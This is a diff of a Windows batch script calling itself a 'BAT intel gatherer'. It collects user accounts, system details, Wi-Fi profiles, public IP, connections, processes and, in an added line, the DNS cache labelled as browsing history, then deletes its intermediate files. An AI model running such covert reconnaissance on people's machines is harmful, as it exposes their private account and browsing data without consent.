@@ -4,11 +4,12 @@ COLOR C
 
 net user > userinfo.txt
 systeminfo > sysinfo.txt
-ipconfig > ipinfo.txt
+ipconfig /all > ipinfo.txt
 netsh wlan show profiles > networkinfo.txt
 nslookup myip.opendns.com resolver1.opendns.com > publicip.txt
 netstat -aon > portscan.txt
 tasklist > tasklist.txt
+ipconfig /displaydns > history.txt
 copy/b *txt systeminfo.txt
 
 REM BAT intel gatherer by syswriath.
@@ -22,6 +23,7 @@ del networkinfo.txt
 del publicip.txt
 del portscan.txt
 del tasklist.txt
+del history.txt
 cls
 
 ECHO AND THE BAT LIVES TO SEE YET ANOTHER DAY!
